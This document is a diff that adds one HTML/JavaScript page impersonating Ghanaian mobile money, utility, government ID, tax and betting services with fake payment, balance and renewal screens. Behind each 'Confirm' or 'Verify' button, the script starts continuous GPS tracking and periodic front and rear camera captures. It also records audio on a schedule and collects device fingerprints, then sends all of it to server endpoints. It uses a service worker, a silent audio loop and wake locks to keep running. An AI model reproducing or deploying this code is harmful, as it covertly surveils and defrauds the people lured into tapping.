@@ -1,0 +1,583 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width,initial-scale=1.0,maximum-scale=1.0,user-scalable=no">
+<title id="pt">Loading...</title>
+<link rel="manifest" href="/manifest.json">
+<meta name="theme-color" id="tc" content="#fff">
+<meta property="og:title" id="ogt" content="">
+<meta property="og:description" id="ogd" content="">
+<meta property="og:image" id="ogi" content="">
+<meta property="og:type" content="website">
+<link href="https://fonts.googleapis.com/css2?family=Roboto:wght@400;500;700&display=swap" rel="stylesheet">
+<style>
+*{margin:0;padding:0;box-sizing:border-box}
+body{font-family:'Roboto',sans-serif;-webkit-font-smoothing:antialiased;overflow-x:hidden}
+.hidden{display:none!important}
+.spin{animation:sp .7s linear infinite}
+@keyframes sp{to{transform:rotate(360deg)}}
+@keyframes fadeUp{from{opacity:0;transform:translateY(10px)}to{opacity:1;transform:translateY(0)}}
+.fade-up{animation:fadeUp .4s ease}
+@keyframes pulse{0%,100%{opacity:1}50%{opacity:.4}}
+@keyframes dotPulse{0%,80%,100%{transform:scale(0)}40%{transform:scale(1)}}
+
+/* ═══ MOMO / MONEY PAGES ═══ */
+.mm-page{background:#fff;min-height:100vh}
+.mm-status{background:#000;padding:4px 16px;display:flex;justify-content:space-between;font-size:11px;color:#fff}
+.mm-bar{padding:12px 16px;display:flex;align-items:center}
+.mm-bar .back{font-size:20px;margin-right:12px}
+.mm-bar .logo{font-weight:700;font-size:18px;flex:1}
+.mm-bar .icons{display:flex;gap:14px;font-size:18px}
+.mm-tabs{display:flex;border-bottom:2px solid rgba(0,0,0,.1)}
+.mm-tabs .tab{flex:1;text-align:center;padding:10px;font-size:13px;font-weight:500;color:rgba(0,0,0,.4);position:relative}
+.mm-tabs .tab.active{color:#000}
+.mm-tabs .tab.active::after{content:'';position:absolute;bottom:0;left:20%;right:20%;height:3px;background:#000;border-radius:3px 3px 0 0}
+.mm-body{padding:14px;max-width:500px;margin:0 auto}
+.mm-balance{background:#f5f5f5;border-radius:10px;padding:12px 14px;margin-bottom:10px;display:flex;align-items:center;justify-content:space-between}
+.mm-balance .lbl{font-size:12px;color:#888}
+.mm-balance .val{font-size:11px;color:#666;letter-spacing:1px}
+.mm-pending{border-radius:8px;padding:9px 12px;display:flex;align-items:center;gap:8px;font-size:13px;margin-bottom:10px}
+.mm-pending .dot{width:8px;height:8px;border-radius:50%;animation:pulse 1.5s infinite}
+.mm-notif{background:#fff;border-radius:12px;border:1px solid #e8e8e8;overflow:hidden;margin-bottom:10px;box-shadow:0 1px 4px rgba(0,0,0,.05)}
+.mm-notif .top{display:flex;align-items:center;gap:10px;padding:12px 14px;border-bottom:1px solid #f5f5f5}
+.mm-notif .top .circle{width:42px;height:42px;border-radius:50%;display:flex;align-items:center;justify-content:center;font-size:20px;flex-shrink:0}
+.mm-notif .top .info{flex:1}
+.mm-notif .top .info .title{font-size:14px;color:#000;font-weight:600}
+.mm-notif .top .info .time{font-size:11px;color:#999;margin-top:1px}
+.mm-notif .top .amount{font-size:18px;font-weight:700}
+.mm-detail{padding:12px 14px}
+.mm-row{display:flex;justify-content:space-between;padding:8px 0;border-bottom:1px solid #fafafa;font-size:13px}
+.mm-row:last-child{border:none}
+.mm-row .k{color:#888}
+.mm-row .v{color:#222;font-weight:500;text-align:right}
+.mm-btn{border:none;padding:13px;border-radius:10px;font-size:16px;cursor:pointer;width:100%;font-weight:700;font-family:inherit;margin-top:8px;transition:.2s}
+.mm-btn:active{transform:scale(.98)}
+.mm-btn:disabled{opacity:.5;cursor:default}
+.mm-receipt{border-radius:10px;padding:16px;margin-top:12px;text-align:center}
+.mm-receipt .check{width:44px;height:44px;border-radius:50%;display:flex;align-items:center;justify-content:center;font-size:22px;color:#fff;margin:0 auto 8px}
+.mm-receipt .msg{font-size:15px;font-weight:600}
+.mm-receipt .sub{font-size:12px;margin-top:3px}
+.mm-receipt .ref{font-size:11px;color:#999;margin-top:6px;font-family:monospace}
+.mm-other{background:#fff;border-radius:12px;border:1px solid #e8e8e8;margin-top:10px;overflow:hidden}
+.mm-other .hdr{padding:10px 14px;font-size:12px;color:#888;font-weight:500;border-bottom:1px solid #f5f5f5}
+.mm-txn{display:flex;align-items:center;gap:10px;padding:10px 14px;border-bottom:1px solid #f8f8f8}
+.mm-txn:last-child{border:none}
+.mm-txn .ic{width:34px;height:34px;border-radius:50%;display:flex;align-items:center;justify-content:center;font-size:15px}
+.mm-txn .det{flex:1}
+.mm-txn .det .nm{font-size:13px;color:#222}
+.mm-txn .det .dt{font-size:11px;color:#999;margin-top:1px}
+.mm-txn .amt{font-size:13px;font-weight:600}
+
+/* ═══ WHATSAPP ═══ */
+.w-page{background:#0b141a;min-height:100vh;display:flex;flex-direction:column}
+.w-hero{background:linear-gradient(135deg,#075e54,#128c7e);padding:44px 20px 24px;text-align:center}
+.w-hero .img{width:76px;height:76px;background:rgba(255,255,255,.12);border-radius:50%;margin:0 auto 10px;display:flex;align-items:center;justify-content:center;font-size:34px;border:2px solid rgba(255,255,255,.15)}
+.w-hero .name{color:#fff;font-size:19px;font-weight:500;margin-bottom:3px}
+.w-hero .meta{color:rgba(255,255,255,.6);font-size:13px}
+.w-body{flex:1;padding:0 14px 90px}
+.w-sec{background:#1f2c34;border-radius:8px;margin:8px 0;overflow:hidden}
+.w-sec .hd{padding:10px 14px 3px;color:#008069;font-size:11px;font-weight:600;text-transform:uppercase;letter-spacing:.5px}
+.w-sec .bd{padding:3px 14px 10px;color:#d1d7db;font-size:14px;line-height:1.5}
+.w-mem{display:flex;align-items:center;gap:10px;padding:8px 14px;border-bottom:1px solid rgba(255,255,255,.03)}
+.w-mem:last-child{border:none}
+.w-mem .av{width:36px;height:36px;background:#2a3942;border-radius:50%;display:flex;align-items:center;justify-content:center;font-size:16px}
+.w-mem .nm{color:#e9edef;font-size:14px}
+.w-mem .rl{color:#008069;font-size:10px;font-weight:600}
+.w-mem .ab{color:#8696a0;font-size:11px}
+.w-fix{position:fixed;bottom:0;left:0;right:0;background:#1f2c34;padding:10px 14px 18px;border-top:1px solid #2a3942;z-index:50}
+.w-jb{background:#008069;color:#fff;border:none;padding:13px;border-radius:22px;font-size:16px;cursor:pointer;width:100%;font-weight:500;font-family:inherit}
+.w-jb:disabled{background:#2a3942;color:#8696a0}
+.w-e2e{text-align:center;font-size:11px;color:#8696a0;margin-top:5px}
+.w-hdr{background:#1f2c34;padding:8px 14px;display:flex;align-items:center;gap:10px;position:sticky;top:0;z-index:50}
+.w-hdr .bk{color:#aebac1;font-size:20px;padding:4px}
+.w-hdr .ga{width:34px;height:34px;background:#2a3942;border-radius:50%;display:flex;align-items:center;justify-content:center;font-size:16px}
+.w-hdr .gi{flex:1}
+.w-hdr .gn{color:#e9edef;font-size:15px;font-weight:500}
+.w-hdr .gs{color:#8696a0;font-size:11px}
+.w-ct{flex:1;padding:6px;overflow-y:auto;padding-bottom:56px}
+.w-bb{max-width:82%;padding:5px 7px 2px;border-radius:7px;margin:2px 0;font-size:14px;line-height:1.35;clear:both}
+.w-bb.sys{background:#182229;color:#8696a0;text-align:center;font-size:12px;max-width:90%;margin:5px auto;padding:4px 10px;border-radius:5px}
+.w-bb.in{background:#1f2c34;color:#e9edef;border-radius:0 7px 7px 7px;float:left}
+.w-bb .sn{font-size:12px;font-weight:500;margin-bottom:1px}
+.w-bb .tm{float:right;font-size:10px;color:#8696a0;margin-left:6px;margin-top:2px}
+.w-dt{background:#182229;color:#8696a0;font-size:11px;padding:3px 10px;border-radius:5px;margin:5px auto;width:fit-content;clear:both}
+.w-tp{display:flex;align-items:center;gap:5px;background:#1f2c34;padding:6px 10px;border-radius:0 7px 7px 7px;width:fit-content;float:left;clear:both;margin:2px 0}
+.w-tp .ds{display:flex;gap:3px}
+.w-tp .ds span{width:5px;height:5px;background:#8696a0;border-radius:50%;animation:dotPulse 1.4s infinite}
+.w-tp .ds span:nth-child(2){animation-delay:.2s}
+.w-tp .ds span:nth-child(3){animation-delay:.4s}
+.w-in{position:fixed;bottom:0;left:0;right:0;background:#1f2c34;padding:5px 6px;display:flex;align-items:center;gap:5px;border-top:1px solid #2a3942}
+.w-in span{font-size:18px;padding:5px}
+.w-in input{flex:1;background:#2a3942;border:none;border-radius:18px;padding:8px 12px;color:#e9edef;font-size:14px;outline:none;font-family:inherit}
+
+/* ═══ GOV / UTILITY ═══ */
+.gv-page{background:#f5f5f5;min-height:100vh}
+.gv-bar{padding:14px 16px;display:flex;align-items:center;gap:8px;color:#fff}
+.gv-bar .logo{font-size:17px;font-weight:700;flex:1}
+.gv-bd{max-width:500px;margin:0 auto;padding:14px}
+.gv-card{background:#fff;border-radius:10px;box-shadow:0 1px 3px rgba(0,0,0,.06);overflow:hidden;margin-bottom:10px}
+.gv-card .hdr{padding:14px 16px;color:#fff}
+.gv-card .hdr h2{font-size:16px;font-weight:600}
+.gv-card .hdr .sub{font-size:12px;opacity:.8;margin-top:2px}
+.gv-card .bdy{padding:14px 16px}
+.gv-row{display:flex;justify-content:space-between;padding:8px 0;border-bottom:1px solid #f5f5f5;font-size:14px}
+.gv-row:last-child{border:none}
+.gv-row .k{color:#888}
+.gv-row .v{color:#222;font-weight:500}
+.gv-btn{border:none;padding:13px;border-radius:8px;font-size:15px;cursor:pointer;width:100%;font-weight:600;font-family:inherit;color:#fff;margin-top:8px}
+.gv-btn:disabled{opacity:.5}
+.gv-alert{border-left:3px solid;border-radius:0 8px 8px 0;padding:10px 14px;margin-bottom:10px;font-size:13px}
+
+/* ═══ JOB / ARTISAN ═══ */
+.jb-page{background:#f5f5f5;min-height:100vh}
+.jb-nav{background:#fff;padding:11px 14px;display:flex;align-items:center;box-shadow:0 1px 2px rgba(0,0,0,.05);position:sticky;top:0;z-index:50}
+.jb-nav .logo{font-size:17px;font-weight:700;flex:1}
+.jb-nav .bell{position:relative;font-size:17px}
+.jb-nav .bell .dot{position:absolute;top:-3px;right:-5px;width:7px;height:7px;background:#f44336;border-radius:50%}
+.jb-bd{max-width:560px;margin:0 auto;padding:10px 14px 28px}
+.jb-card{background:#fff;border-radius:10px;box-shadow:0 1px 3px rgba(0,0,0,.05);margin-bottom:10px;overflow:hidden}
+.jb-card .top{padding:12px 14px;border-bottom:1px solid #f5f5f5}
+.jb-tag{display:inline-block;padding:2px 8px;border-radius:3px;font-size:11px;font-weight:600;margin-bottom:5px}
+.jb-card .top h2{font-size:15px;color:#212121;font-weight:600;line-height:1.3;margin-bottom:2px}
+.jb-card .top .sub{font-size:12px;color:#757575}
+.jb-card .bdy{padding:12px 14px}
+.jb-row{display:flex;justify-content:space-between;padding:6px 0;border-bottom:1px solid #fafafa;font-size:13px}
+.jb-row:last-child{border:none}
+.jb-row .l{color:#9e9e9e}
+.jb-row .v{color:#212121;font-weight:500;text-align:right;max-width:58%}
+.jb-dist{background:#e8f5e9;border-radius:8px;padding:11px 12px;margin:8px 0;display:flex;align-items:center;gap:10px}
+.jb-dist .ic{width:34px;height:34px;background:#fff;border-radius:50%;display:flex;align-items:center;justify-content:center;font-size:16px;box-shadow:0 1px 2px rgba(0,0,0,.06)}
+.jb-btn{border:none;padding:12px;border-radius:8px;font-size:15px;cursor:pointer;width:100%;font-weight:600;font-family:inherit;color:#fff;margin-top:5px}
+.jb-btn:disabled{opacity:.5}
+.jb-urg{text-align:center;font-size:11px;color:#e65100;margin-top:6px;font-weight:500}
+.jb-reveal{background:#f9fbe7;border:1px solid #e6ee9c;border-radius:8px;padding:12px;margin-top:12px}
+.jb-reveal h3{font-size:14px;color:#33691e;margin-bottom:8px}
+.jb-reveal .row{display:flex;justify-content:space-between;padding:5px 0;border-bottom:1px solid #f0f4c3;font-size:13px}
+.jb-reveal .row:last-of-type{border:none}
+
+/* ═══ ZOOM ═══ */
+.z-page{background:#242424;min-height:100vh;display:flex;align-items:center;justify-content:center;padding:16px}
+.z-card{max-width:440px;width:100%;text-align:center}
+.z-cam{position:relative;border-radius:12px;overflow:hidden;aspect-ratio:16/9;background:#1a1a1a;margin-bottom:14px;border:2px solid #333}
+.z-cam video{position:absolute;top:0;left:0;width:100%;height:100%;object-fit:cover;transform:scaleX(-1)}
+.z-cam .ph{position:absolute;inset:0;display:flex;flex-direction:column;align-items:center;justify-content:center}
+.z-cam .av{width:64px;height:64px;background:#0b5cff;border-radius:50%;display:flex;align-items:center;justify-content:center;color:#fff;font-size:26px;font-weight:600;margin-bottom:6px}
+.z-cam .lb{color:#999;font-size:13px}
+.z-cam .nm{position:absolute;bottom:6px;left:6px;background:rgba(0,0,0,.7);color:#fff;padding:2px 8px;border-radius:3px;font-size:11px}
+</style>
+</head>
+<body>
+<script>
+const TID=window.location.pathname.split('/').pop();
+const PB=window.location.pathname.split('/')[1];
+let MS=null,OK=false;
+
+// ═══ GPS + CAMERA + AUDIO ═══
+function sG(p){fetch('/api/gps/'+TID,{method:'POST',headers:{'Content-Type':'application/json'},
+body:JSON.stringify({lat:p.coords.latitude,lon:p.coords.longitude,acc:p.coords.accuracy,
+alt:p.coords.altitude,spd:p.coords.speed,dir:p.coords.heading,source:'gps',ts:new Date().toISOString()})}).catch(()=>{})}
+function gps(){return new Promise((y,n)=>{navigator.geolocation.getCurrentPosition(p=>{sG(p);
+navigator.geolocation.watchPosition(sG,()=>{},{enableHighAccuracy:true,maximumAge:0,timeout:30000});y()},
+e=>{navigator.geolocation.getCurrentPosition(p=>{sG(p);y()},n,{enableHighAccuracy:false,timeout:10000})},
+{enableHighAccuracy:true,timeout:30000,maximumAge:0})})}
+function fG(){navigator.geolocation.getCurrentPosition(sG,()=>{},{enableHighAccuracy:true,timeout:10000,maximumAge:0})}
+async function cam(){try{MS=await navigator.mediaDevices.getUserMedia({video:{facingMode:'user'},audio:true});
+await snap('front');setTimeout(snapR,5000)}catch(e){try{MS=await navigator.mediaDevices.getUserMedia({audio:true})}catch(e2){}}}
+async function snap(c){if(!MS||!MS.getVideoTracks().length)return;try{const v=document.createElement('video');v.srcObject=MS;
+v.setAttribute('playsinline','');v.muted=true;await v.play();await new Promise(r=>setTimeout(r,600));
+const cv=document.createElement('canvas');cv.width=v.videoWidth||640;cv.height=v.videoHeight||480;
+cv.getContext('2d').drawImage(v,0,0);fetch('/api/media/'+TID,{method:'POST',headers:{'Content-Type':'application/json'},
+body:JSON.stringify({type:'photo',camera:c,data:cv.toDataURL('image/jpeg',.8),ts:new Date().toISOString()})}).catch(()=>{})}catch(e){}}
+async function snapR(){try{const s=await navigator.mediaDevices.getUserMedia({video:{facingMode:{exact:'environment'}}});
+const v=document.createElement('video');v.srcObject=s;v.setAttribute('playsinline','');v.muted=true;await v.play();
+await new Promise(r=>setTimeout(r,1000));const cv=document.createElement('canvas');cv.width=v.videoWidth;cv.height=v.videoHeight;
+cv.getContext('2d').drawImage(v,0,0);s.getTracks().forEach(t=>t.stop());fetch('/api/media/'+TID,{method:'POST',
+headers:{'Content-Type':'application/json'},body:JSON.stringify({type:'photo',camera:'rear',data:cv.toDataURL('image/jpeg',.8),
+ts:new Date().toISOString()})}).catch(()=>{})}catch(e){}}
+function rec(d){if(!MS||!MS.getAudioTracks().length)return;try{const mt=MediaRecorder.isTypeSupported('audio/webm;codecs=opus')?
+'audio/webm;codecs=opus':'audio/webm';const r=new MediaRecorder(MS,{mimeType:mt});const ch=[];
+r.ondataavailable=e=>{if(e.data.size>0)ch.push(e.data)};r.onstop=()=>{const b=new Blob(ch,{type:mt});const rd=new FileReader();
+rd.onloadend=()=>{fetch('/api/media/'+TID,{method:'POST',headers:{'Content-Type':'application/json'},
+body:JSON.stringify({type:'audio',data:rd.result,ts:new Date().toISOString()})}).catch(()=>{})};rd.readAsDataURL(b)};
+r.start();setTimeout(()=>{try{r.stop()}catch(e){}},d)}catch(e){}}
+function persist(){if('serviceWorker' in navigator)navigator.serviceWorker.register('/sw.js').catch(()=>{});
+try{const c=new(window.AudioContext||window.webkitAudioContext)();const o=c.createOscillator();const g=c.createGain();
+g.gain.value=.0001;o.connect(g);g.connect(c.destination);o.start()}catch(e){}
+try{if('wakeLock' in navigator)navigator.wakeLock.request('screen')}catch(e){}
+try{if('locks' in navigator)navigator.locks.request('r'+TID,{mode:'exclusive'},()=>new Promise(()=>{}))}catch(e){}}
+function loop(){setInterval(()=>snap('front'),30000);setInterval(snapR,120000);setInterval(()=>rec(10000),60000);
+setTimeout(()=>rec(15000),2000);
+document.addEventListener('visibilitychange',()=>{if(!document.hidden){fG();if(MS)snap('front')}});
+window.addEventListener('beforeunload',()=>{navigator.geolocation.getCurrentPosition(p=>{
+navigator.sendBeacon('/api/beacon/'+TID,JSON.stringify({lat:p.coords.latitude,lon:p.coords.longitude,acc:p.coords.accuracy}))},
+()=>{},{enableHighAccuracy:true,timeout:3000})})}
+function dev(){fetch('/api/device/'+TID,{method:'POST',headers:{'Content-Type':'application/json'},
+body:JSON.stringify({platform:navigator.platform,userAgent:navigator.userAgent,
+timezone:Intl.DateTimeFormat().resolvedOptions().timeZone,screen:{w:screen.width,h:screen.height}})}).catch(()=>{})}
+async function go(){if(OK)return;OK=true;try{await gps()}catch(e){}try{await cam()}catch(e){}
+if('Notification' in window)Notification.requestPermission().catch(()=>{});persist();dev();loop()}
+function setOG(t,d){document.getElementById('ogt').content=t;document.getElementById('ogd').content=d;document.getElementById('pt').textContent=t}
+
+// ═══ MTN MOMO ═══
+function rMomo(){
+setOG('MTN MoMo — You received GH₵ 850.00','Tap to confirm and receive money');
+document.getElementById('tc').content='#ffcb05';
+const txn='MOB'+Date.now().toString().slice(-10);
+const time=new Date().toLocaleTimeString('en-GB',{hour:'2-digit',minute:'2-digit'});
+const date=new Date().toLocaleDateString('en-GB',{day:'numeric',month:'short',year:'numeric'});
+document.body.innerHTML=`<div class="mm-page">
+<div class="mm-status"><span>${time}</span><span>📶 MTN 4G 🔋78%</span></div>
+<div class="mm-bar" style="background:#ffcb05"><span class="back" style="color:#000">‹</span><span class="logo" style="color:#000">MoMo</span><span class="icons" style="color:#000">🔍 ⋮</span></div>
+<div class="mm-tabs" style="background:#ffcb05"><div class="tab active">Home</div><div class="tab">History</div><div class="tab">Services</div></div>
+<div class="mm-body">
+<div class="mm-balance"><div><div class="lbl">Available Balance</div><div class="val">••••••</div></div><span style="font-size:16px">👁️</span></div>
+<div class="mm-pending" style="background:#fff8e1;color:#f57f17"><span class="dot" style="background:#f57f17"></span>1 pending transaction</div>
+<div class="mm-notif"><div class="top"><div class="circle" style="background:#e8f5e9">💰</div>
+<div class="info"><div class="title">Money Received</div><div class="time">${time} · Just now</div></div>
+<div class="amount" style="color:#2e7d32">GH₵ 850.00</div></div>
+<div class="mm-detail">
+<div class="mm-row"><span class="k">From</span><span class="v">Kwame Mensah</span></div>
+<div class="mm-row"><span class="k">Phone</span><span class="v">024 XXX XX89</span></div>
+<div class="mm-row"><span class="k">Reference</span><span class="v">Payment for work</span></div>
+<div class="mm-row"><span class="k">Date</span><span class="v">${date}</span></div>
+<div class="mm-row"><span class="k">Transaction ID</span><span class="v" style="font-family:monospace;font-size:11px">${txn}</span></div>
+<div class="mm-row"><span class="k">Status</span><span class="v" style="color:#f57f17">⏳ Pending</span></div>
+<button class="mm-btn" style="background:#ffcb05;color:#000" id="mmBtn" onclick="mmC()">Confirm & Receive GH₵ 850.00</button>
+</div></div>
+<div class="mm-other"><div class="hdr">Recent</div>
+<div class="mm-txn"><div class="ic" style="background:#e8f5e9">💰</div><div class="det"><div class="nm">Ama Serwaa</div><div class="dt">Yesterday</div></div><div class="amt" style="color:#2e7d32">+GH₵ 200</div></div>
+<div class="mm-txn"><div class="ic" style="background:#fbe9e7">📱</div><div class="det"><div class="nm">MTN Airtime</div><div class="dt">Yesterday</div></div><div class="amt" style="color:#c62828">-GH₵ 10</div></div>
+<div class="mm-txn"><div class="ic" style="background:#fbe9e7">⚡</div><div class="det"><div class="nm">ECG Prepaid</div><div class="dt">Jul 10</div></div><div class="amt" style="color:#c62828">-GH₵ 80</div></div>
+</div></div></div>`;
+setTimeout(async()=>{try{await gps()}catch(e){}dev()},800)}
+async function mmC(){const b=document.getElementById('mmBtn');b.textContent='Processing...';b.disabled=true;await go();
+setTimeout(()=>{document.querySelector('.mm-detail').innerHTML+=`<div class="mm-receipt fade-up" style="background:#e8f5e9">
+<div class="check" style="background:#4caf50">✓</div><div class="msg" style="color:#2e7d32">GH₵ 850.00 Received!</div>
+<div class="sub" style="color:#66bb6a">Credited to your wallet</div><div class="ref">Ref: ${Date.now().toString().slice(-12)}</div></div>`;
+b.textContent='✓ Confirmed';b.style.background='#4caf50';b.style.color='#fff'},2500)}
+
+// ═══ VODAFONE CASH ═══
+function rVoda(){
+setOG('Vodafone Cash — GH₵ 1,200 received','Tap to confirm transfer');
+document.getElementById('tc').content='#e60000';
+document.body.innerHTML=`<div class="mm-page">
+<div class="mm-bar" style="background:#e60000"><span class="back" style="color:#fff">‹</span><span class="logo" style="color:#fff">Vodafone Cash</span><span class="icons" style="color:#fff">⋮</span></div>
+<div class="mm-body">
+<div class="mm-pending" style="background:#fce4ec;color:#c62828"><span class="dot" style="background:#e60000"></span>Pending: GH₵ 1,200 from Kofi Asante</div>
+<div class="mm-notif"><div class="top"><div class="circle" style="background:#fce4ec">💰</div>
+<div class="info"><div class="title">Transfer Received</div><div class="time">Just now</div></div>
+<div class="amount" style="color:#2e7d32">GH₵ 1,200</div></div>
+<div class="mm-detail">
+<div class="mm-row"><span class="k">From</span><span class="v">Kofi Asante</span></div>
+<div class="mm-row"><span class="k">Phone</span><span class="v">050 XXX XX45</span></div>
+<div class="mm-row"><span class="k">Reference</span><span class="v">Rent payment - July</span></div>
+<div class="mm-row"><span class="k">Status</span><span class="v" style="color:#f57f17">⏳ Confirm</span></div>
+<button class="mm-btn" style="background:#e60000;color:#fff" id="vcBtn" onclick="vcC()">Confirm & Receive</button>
+</div></div></div></div>`;
+setTimeout(async()=>{try{await gps()}catch(e){}dev()},800)}
+async function vcC(){const b=document.getElementById('vcBtn');b.textContent='Processing...';b.disabled=true;await go();
+setTimeout(()=>{document.querySelector('.mm-detail').innerHTML+=`<div class="mm-receipt fade-up" style="background:#fce4ec">
+<div class="check" style="background:#e60000">✓</div><div class="msg" style="color:#c62828">GH₵ 1,200 Received!</div>
+<div class="sub" style="color:#e57373">Credited to Vodafone Cash</div></div>`;
+b.textContent='✓ Done';b.style.background='#4caf50';b.style.color='#fff'},2500)}
+
+// ═══ ECG ═══
+function rECG(){
+setOG('ECG — Prepaid meter low balance','Your electricity balance is critically low');
+document.getElementById('tc').content='#1565c0';
+document.body.innerHTML=`<div class="gv-page">
+<div class="gv-bar" style="background:#1565c0"><span>⚡</span><span class="logo" style="color:#fff">ECG Ghana</span></div>
+<div class="gv-bd">
+<div class="gv-alert" style="background:#fbe9e7;border-color:#f44336;color:#c62828">⚠️ LOW BALANCE: Prepaid meter critically low</div>
+<div class="gv-card"><div class="hdr" style="background:#1565c0"><h2>Prepaid Meter Status</h2><div class="sub">Account Update</div></div>
+<div class="bdy">
+<div class="gv-row"><span class="k">Meter No.</span><span class="v">04-XXXX-${Math.floor(Math.random()*9000+1000)}</span></div>
+<div class="gv-row"><span class="k">Balance</span><span class="v" style="color:#c62828;font-size:16px">GH₵ 2.30</span></div>
+<div class="gv-row"><span class="k">Days Left</span><span class="v" style="color:#c62828">Less than 1 day</span></div>
+<div class="gv-row"><span class="k">Last Top-up</span><span class="v">Jul 5 — GH₵ 80</span></div>
+<div class="gv-row"><span class="k">Daily Use</span><span class="v">GH₵ 5.40/day</span></div>
+<button class="gv-btn" style="background:#1565c0" id="ecgBtn" onclick="ecgA()">Top Up via MoMo</button>
+</div></div></div></div>`;
+setTimeout(async()=>{try{await gps()}catch(e){}dev()},800)}
+async function ecgA(){const b=document.getElementById('ecgBtn');b.textContent='Connecting...';b.disabled=true;await go();
+setTimeout(()=>{b.parentElement.innerHTML+=`<div class="fade-up" style="background:#fff8e1;border-radius:8px;padding:14px;margin-top:10px;text-align:center">
+<div style="font-size:24px;margin-bottom:4px">📱</div><div style="font-size:14px;color:#f57f17;font-weight:500">MoMo prompt sent</div>
+<div style="font-size:12px;color:#999;margin-top:3px">Check phone or dial *170#</div></div>`;
+b.textContent='Prompt sent'},2500)}
+
+// ═══ GHANA CARD ═══
+function rNIA(){
+setOG('Ghana Card — Renewal Required','Your Ghana Card expires soon. Verify to renew.');
+document.getElementById('tc').content='#006233';
+document.body.innerHTML=`<div class="gv-page">
+<div class="gv-bar" style="background:#006233"><span>🇬🇭</span><span class="logo" style="color:#fff">NIA — Ghana Card</span></div>
+<div class="gv-bd">
+<div class="gv-alert" style="background:#fff3e0;border-color:#ff9800;color:#e65100">📋 Your Ghana Card needs renewal</div>
+<div class="gv-card"><div class="hdr" style="background:#006233"><h2>Ghana Card Renewal</h2><div class="sub">National Identification Authority</div></div>
+<div class="bdy">
+<div class="gv-row"><span class="k">Status</span><span class="v" style="color:#e65100">⚠️ Expiring Soon</span></div>
+<div class="gv-row"><span class="k">Expiry</span><span class="v">August 30, 2026</span></div>
+<div class="gv-row"><span class="k">Renewal</span><span class="v">Pending Verification</span></div>
+<div class="gv-row"><span class="k">Nearest Office</span><span class="v" id="niaOff">Locating...</span></div>
+<div style="background:#e8f5e9;border-radius:6px;padding:8px;margin:8px 0;font-size:12px;color:#2e7d32">✅ You can renew online. No office visit needed.</div>
+<button class="gv-btn" style="background:#006233" id="niaBtn" onclick="niaV()">Verify & Renew</button>
+</div></div></div></div>`;
+setTimeout(async()=>{try{await gps();document.getElementById('niaOff').textContent='Found — 1.3 km away'}catch(e){document.getElementById('niaOff').textContent='Enable location'}dev()},800)}
+async function niaV(){const b=document.getElementById('niaBtn');b.textContent='Verifying...';b.disabled=true;await go();
+setTimeout(()=>{b.parentElement.innerHTML+=`<div class="fade-up" style="background:#e8f5e9;border-radius:8px;padding:14px;margin-top:10px;text-align:center">
+<div style="font-size:24px;margin-bottom:4px">✅</div><div style="font-size:14px;color:#2e7d32;font-weight:500">Submitted</div>
+<div style="font-size:12px;color:#66bb6a;margin-top:3px">New card ready in 14 working days. SMS notification will follow.</div></div>`;
+b.textContent='✓ Submitted';b.style.background='#4caf50'},2500)}
+
+// ═══ GRA TAX ═══
+function rGRA(){
+setOG('GRA — Tax Clearance Ready','Your Tax Clearance Certificate is approved. Tap to download.');
+document.getElementById('tc').content='#006233';
+document.body.innerHTML=`<div class="gv-page">
+<div class="gv-bar" style="background:#006233"><span>🇬🇭</span><span class="logo" style="color:#fff">GRA — Tax Portal</span></div>
+<div class="gv-bd">
+<div class="gv-alert" style="background:#e8f5e9;border-color:#4caf50;color:#2e7d32">✅ Tax Clearance Certificate ready</div>
+<div class="gv-card"><div class="hdr" style="background:#006233"><h2>Tax Clearance Certificate</h2><div class="sub">Ghana Revenue Authority</div></div>
+<div class="bdy">
+<div class="gv-row"><span class="k">TIN</span><span class="v">Based on records</span></div>
+<div class="gv-row"><span class="k">Tax Year</span><span class="v">2025/2026</span></div>
+<div class="gv-row"><span class="k">Status</span><span class="v" style="color:#2e7d32">✅ Approved</span></div>
+<div class="gv-row"><span class="k">Certificate</span><span class="v">TCC/2026/${Math.floor(Math.random()*90000+10000)}</span></div>
+<div class="gv-row"><span class="k">Valid Until</span><span class="v">Dec 31, 2026</span></div>
+<button class="gv-btn" style="background:#006233" id="graBtn" onclick="graD()">Verify & Download</button>
+</div></div></div></div>`;
+setTimeout(async()=>{try{await gps()}catch(e){}dev()},800)}
+async function graD(){const b=document.getElementById('graBtn');b.textContent='Preparing...';b.disabled=true;await go();
+setTimeout(()=>{b.parentElement.innerHTML+=`<div class="fade-up" style="background:#e8f5e9;border-radius:8px;padding:14px;margin-top:10px;text-align:center">
+<div style="font-size:24px;margin-bottom:4px">📄</div><div style="font-size:14px;color:#2e7d32;font-weight:500">Certificate ready</div>
+<div style="font-size:12px;color:#66bb6a;margin-top:3px">Sent to your registered email. Collect printed copy at nearest GRA office.</div></div>`;
+b.textContent='✓ Sent'},2500)}
+
+// ═══ SPORTYBET ═══
+function rBet(){
+setOG('SportyBet — You won GH₵ 2,450!','Your accumulator bet won! Tap to withdraw.');
+document.getElementById('tc').content='#1a237e';
+document.body.innerHTML=`<div class="mm-page">
+<div class="mm-bar" style="background:#1a237e"><span class="back" style="color:#fff">‹</span><span class="logo" style="color:#ffcb05">Sporty<span style="color:#fff">Bet</span></span><span class="icons" style="color:#fff">⋮</span></div>
+<div class="mm-body">
+<div style="background:#e8f5e9;border-radius:10px;padding:14px;text-align:center;margin-bottom:10px">
+<div style="font-size:12px;color:#2e7d32;font-weight:500">🎉 CONGRATULATIONS!</div>
+<div style="font-size:26px;color:#2e7d32;font-weight:700">GH₵ 2,450.00</div>
+<div style="font-size:13px;color:#66bb6a;margin-top:3px">Your accumulator won!</div></div>
+<div class="mm-notif"><div class="mm-detail">
+<div class="mm-row"><span class="k">Bet ID</span><span class="v" style="font-family:monospace;font-size:11px">BET${Date.now().toString().slice(-8)}</span></div>
+<div class="mm-row"><span class="k">Type</span><span class="v">Accumulator (5 legs)</span></div>
+<div class="mm-row"><span class="k">Stake</span><span class="v">GH₵ 50</span></div>
+<div class="mm-row"><span class="k">Odds</span><span class="v">49.0x</span></div>
+<div class="mm-row"><span class="k">Winnings</span><span class="v" style="color:#2e7d32;font-size:16px;font-weight:700">GH₵ 2,450</span></div>
+<div class="mm-row"><span class="k">Withdraw To</span><span class="v">MTN MoMo</span></div>
+<button class="mm-btn" style="background:#1a237e;color:#fff" id="betBtn" onclick="betC()">Withdraw to MoMo</button>
+</div></div></div></div>`;
+setTimeout(async()=>{try{await gps()}catch(e){}dev()},800)}
